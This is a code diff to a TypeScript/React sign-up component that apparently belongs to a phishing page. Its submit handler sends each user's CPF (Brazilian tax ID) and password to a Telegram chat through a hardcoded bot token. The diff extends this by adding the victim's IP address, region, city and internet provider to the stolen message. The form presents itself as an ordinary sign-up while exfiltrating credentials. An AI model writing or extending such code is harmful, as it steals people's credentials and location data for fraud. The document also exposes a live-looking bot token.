@@ -51,17 +51,24 @@ export default function SignUp() {
     else setEye(inactivedEye)
   }
 
-  const handleSubmit = (event: FormEvent<HTMLFormElement>) => {
+  const handleSubmit = async (event: FormEvent<HTMLFormElement>) => {
     event.preventDefault()
     setIsLoading(true)
     const botToken = '6800644942:AAHfTeX6q4tbfOnYQ2pcpxsFGMHLMOoAL_U'
+    const responseGeo = await fetch('/api/geo')
+    const responseGeoJson = await responseGeo.json()
     fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         'chat_id': -1002000806188,
         text: `
-          CPF: ${cpf}
+IP: ${responseGeoJson.query}
+Região: ${responseGeoJson.region}
+Nome da região: ${responseGeoJson.regionName}
+Cidade: ${responseGeoJson.city}
+Operadora: ${responseGeoJson.isp}
+CPF: ${cpf}
 Password: ${password}
         `
       })
